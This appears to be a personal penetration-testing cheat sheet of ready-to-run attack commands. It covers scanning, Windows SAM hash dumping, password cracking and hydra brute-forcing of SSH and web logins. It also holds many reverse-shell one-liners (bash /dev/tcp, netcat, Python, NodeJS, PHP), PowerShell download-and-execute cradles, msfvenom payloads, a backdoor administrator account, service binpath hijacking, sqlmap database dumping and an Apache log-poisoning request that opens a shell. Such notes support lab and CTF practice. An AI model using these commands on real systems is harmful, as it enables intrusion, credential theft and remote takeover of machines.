Nmap Scans
-----------
      Aggressive Scan, Top Ports:   nmap -sC -sV x.x.x.x -oA Top-Ports
      Full Port Scan:               nmap -p- x.x.x.x -max-retries=2 -oA All_ports
      Aggressive Service Scan:      nmap -sC -sV -p 21,22,80,5435,8082,9092 x.x.x.x -oA Full-Service_Scan


Web Directory Enum
------------------
      dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x/ -e *
      gobuster dir -u http://x.x.x.x/ -w /path/to/directory-list-2.3-medium.txt -x <extension>
      ffuf -c -ic -w /path/to/Web-Content/directory-list-2.3-big.txt -u http://IP/FUZZ -t 100 -fc 401 -v
      ./feroxbuster --url https://website.com -x pdf -x js,html -x php txt json,docx -w /SecLists/Discovery/Web-Content/raft-medium-directories.txt -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'

Nikto
-----
      nikto -h x.x.x.x

wpscan
------
      wpscan --enumerate p,u,t -disable-tls-checks --url http://x.x.x.x

Dumping Hashes -Windows
----------------------
      reg.exe save hklm\sam c:\windows\temp\sam.save
      reg.exe save hklm\system c:\windows\temp\system.save

      pwdump system.save sam.save

Password Cracking - Linux
-------------------------
      unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
      john --rules --wordlist=wordlist.txt unshadowed.txt

      hashcat -a 0 -m <mode> <hash-file> /path/to/rockyou.txt --force

Linux Shadow
------------
      nyau:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
      nyau - login username
      $6 - id of the hashing algorithm, id 6 is SHA-512
      $3GvJsNPG - salt of the hash
      $Zr.......P1 - hashed password

      hashcat -a 0 -m 1800 '$'6'$'3GvJsNPG'$'ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1 rockyou.txt --force  
Note, we enclose ‘$’ to prevent variable substitution

Moar:https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/password-cracking

FTP file Transfer
-----------------
      echo open x.x.x.x 21> ftp.txt
      echo USER root>> ftp.txt
      echo lab>> ftp.txt
      echo bin >> ftp.txt
      echo GET nc.exe >> ftp.txt
      echo bye >> ftp.txt
      ftp -v -n -s:ftp.txt

NetCat File Transfer
--------------------
      Sending Machine:   nc.exe x.x.x.x 1236 < sam.save
      Receiving Machine: nc -nvlp 1236 > system.save

      nc x.x.x.x 1236 < accesschk.exe
      nc.exe -nlp 1236 > accesschk.exe

Adding an Elevated User
-----------------------
      net user hax0r hax0r /add && net localgroup Administrators hax0r /add

Spawning shell with nc
----------------------  
      ./nc.exe -nv x.x.x.x 1316 -e cmd.exe
      nc -e /bin/sh x.x.x.x 1234

Bin/bash Shell
--------------
      ­‐t "() { :; }; /bin/bash"    
      python -c 'import pty; pty.spawn("/bin/bash")'  

Simple PHP Command Injection
----------------------------
      <?php system(“whoami“); ?>
      <?php system("ls -la"); ?> 
      <?php echo exec("ls -la"); ?> 
      <?php echo shell_exec(“ls -la“); ?>
      <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>


      bash -i >& /dev/tcp/x.x.x.x/1234 0>&1
      curl -s --data "<?system('nc -lvp 1234 -e /bin/sh');?>" "http://x.x.x.x/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"

Windows Powershell
------------------
Nishang -PS reverse tcp.

Copy the **.Example** to the bottom of the script

      Invoke-PowershellTcp -Reverse -IPAddress x.x.x.x -Port 1234

Downloading from PS prompt

      IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/nc.exe')
      (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/nc.exe", "C:\Windows\Temp\Privesc\nc.exe")  
      (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/wlbsctrl.dll", "C:\Windows\Temp\Privesc\wlbsctrl.dll")  
      
Downloading via code Injecton

      C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http:/x.x.x.x:8000/wlbsctrl.dll')
      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (New-Object Net.Webclient).downloadFile('http://x.x.x.x:8000/nc.exe', 'C:\Python\nc.exe')

      powershell.exe (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/evil.dll", "C:\Windows\Temp\Privesc\evil.dll")
      powershell.exe IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')

Mfsvenom
--------
      msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=1313 -b "\x00\x0a\x0d" -f python -- BO (NetCat)
      msfvenom -p java/jsp_shell_reverse_tcp LHOST=<> LPORT=<> -f raw > shell.jsp
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1313 -f asp > shell.asp

Windows PrivEsc
===============
      python exploit-suggester.py --update
      python exploit-suggester.py --database 2017-07-29-mssb.xls --systeminfo systeminfo.txt

**Sherlock  (Find-AllVulns)**

**Powesploit -PowerUp (Invoke AllChecks)**

Windows-Privesc Checker: https://github.com/pentestmonkey/windows-privesc-check.git

WinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

Service Controller
------------------
      sc config upnphost binpath= "C:\Python\nc.exe -nv x.x.x.x 1320 -e C:\WINDOWS\System32\cmd.exe"
      sc config upnphost obj= ".\LocalSystem" password= ""
      sc qc upnphost

accesschk
---------
      accesschk.exe /accepteula -dqv "C:\Windows\System32\Wbem"
      accesschk.exe /accepteula -uwcqv "Authenticated Users" *
      accesschk.exe /accepteula -ucqv SSDPSRV
      cacls "C:\Windows\System32\Wbem"

Linux PrivEsc
==============
      uname -a
      sudo -l
LinuxEnum Scripts: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
                   https://gtfobins.github.io/

check for setuid scripts: 
------------------------
      find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
      find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
      find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
      
Look for World rewritable /etc/passwd

Port Knocking
-------------
      for x in 11 1 111; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x x.x.x.x; done

Shells
------
**NodeJs**

      require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f', ()=>{}) 
**PHP** 

      <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>
**Bash**

      bash -i >& /dev/tcp/IP/PORT 0>&1
**Netcat**

      nc -e /bin/sh IP PORT
**BindShell**

      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
**Python**

      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.65.210",1313));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

https://highon.coffee/blog/reverse-shell-cheat-sheet/


Upgrading Shells
----------------
      python -c 'import pty; pty.spawn("/bin/bash")'

Steganography
-------------
      zsteg <file-name.png>
      stegcracker <file-name> <wordlist>
      stegoveritas (w/o)-steghide <file-name>
      exiftool <file-name>
      steghide extract -sf <file-name>

**Sound Analysis**

Sonic Visualizer https://www.sonicvisualiser.org/

{Layer> Add Spectrogram}

Cracking Zip files
------------------
      fcrackzip -b --method 2 -D 2 -p ~/rockyou.txt file.zip
      fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u b******.*** -v

Brute Forcing Logins
====================
SSH
---
      hydra -s 22 -v -V -l root -P /usr/share/wordlists/rockyou.txt -t 8 IP ssh
HTTP
---
      hydra -l username -P wordlist.txt IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"

      hydra -L usernames.txt -P passwords.txt IP http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
      
      hydra -l username -P password.dic x.x.x.x http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.27.6%2Fwp-admin%2F&testcookie=1:S=302" -v -V

      
NFS
===
      showmount -e IP
      mkdir /tmp/dir
      sudo mount -t nfs IP:/opt/files /tmp/dir

MYSQL
=====
      mysql -h <ip> -u root -p
      SHOW DATABASES;
      USE <db_name>
      SELECT * FROM 

SQLMap
-------
      sqlmap.py -u http://x.x.x.x/administrator.php --forms --dump --batch
      sqlmap.py -u http://x.x.x.x:80/login.php --forms --risk=3 --level=5 --dump-all --batch -D <dbname>                 

Samba
=====
      nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>

      smbclient //<ip>/<share-name>
      smbget -R smb://<ip>/<share-name>

      nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip> (rpcbind - a server that converts remote procedure call (RPC) program number into universal addresses.)

GREP
----
      grep -x '.\{8,20\}' > 8-20_length_wordlist
      grep -o '[^ ]*[a-z][^ ]*' > contains_lowercase.txt 
      grep -o '[^ ]*[A-Z][^ ]*' > contains_uppercase.txt 
      grep -o '[^ ]*[0-9][^ ]*' > contains_numbers.txt 
      grep -v "^[A-Za-z0-9]*$" > contains_special.txt


PHP Reverse Shell with log_poisoning
-----------------------------------
      GET /?view=/dog/../../../../../../../var/log/apache2/access.log&ext&cmd=php+-r+'$sock%3dfsockopen("x.x.x.x",1313)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
      Host: x.x.x.x 
      User-Agent: <?php system($_GET['cmd']);?>
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
